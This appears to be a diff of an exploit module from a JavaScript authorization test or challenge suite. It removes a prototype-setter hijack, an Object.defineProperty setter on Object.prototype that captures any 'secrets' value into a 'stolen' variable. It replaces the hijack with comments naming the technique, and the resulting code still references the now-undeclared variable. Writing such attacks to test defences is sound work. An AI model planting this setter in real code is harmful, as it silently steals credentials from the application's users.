@@ -1,22 +1,7 @@
-  /* {
-    'www.google.com': {
-      headers: {
-        Authorization: 'Bearer ANY_SECRET'
-      },
-      method: 'GET'
-    }
-  } */
+// Override prototype setter via defineProperty
+// Target: setSecrets
 
-let stolen;
-
-// grab all secrets, because of override mistake
-Object.defineProperty(Object.prototype, "secrets", {
-  set: (v) => {
-    stolen = v;
-  },
-});
-
-export const attack = (authzManager, success) => {
+export const attack = authzManager => {
   if (stolen) {
     console.log('stolen', stolen);
   }
